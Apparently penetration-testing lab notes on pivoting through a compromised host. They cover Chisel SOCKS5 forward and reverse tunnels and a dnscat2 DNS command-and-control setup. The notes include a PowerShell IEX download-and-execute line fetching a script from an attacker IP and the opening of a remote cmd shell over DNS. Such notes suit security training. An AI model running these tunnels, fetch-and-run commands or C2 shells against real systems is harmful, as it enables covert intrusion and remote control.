# Tunneling Servers

## Chisel - SOCKS5

[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment.

Used to create an inter-work tunnel on compromised host.

```bash
# Install from apt or build from source (apt is smaller)
sudo apt install chisel

# Fire it over
scp /usr/bin/chisel ubuntu@10.129.202.64:~/
```

On pivot host:

```bash
./chisel server -v -p 1234 --socks5
```

Connecting with attack host:

```bash
./chisel client -v 10.129.202.64:1234 socks

# Proxy it
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Chisel Reverse Pivot

Use reverse in case of firewall restrictions.

From attack box:

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
```

On pivot host

```bash
./chisel client -v 10.10.14.17:1234 R:socks
```

---

## Dnscat2 - DNS

[Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol. 

### Install

```bash
git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

### Run and note secret key

```bash
# Run the server
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

-- SNIP --
Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=06050401beb8635b47f7af6298dee503 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=06050401beb8635b47f7af6298dee503
-- SNIP --
```

### Execute [dnscat2.ps1](git clone https://github.com/lukebaggett/dnscat2-powershell.git) to host.

```powershell
IWR -Uri http://10.10.15.111/dnscat2.ps1 -OutFile C:\temp\dns.ps1
Import-Module .\dns.ps1

# Or
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.15.111/dnscat2.ps1')

# Start
Start-Dnscat2 -DNSserver 10.10.15.111 -Domain inlanefreight.local -PreSharedSecret 06050401beb8635b47f7af6298dee503 -Exec cmd 
```

### Back to Cat

```bash
dnscat2> New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

# Drop into a shell
dnscat2> window -i 1

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```



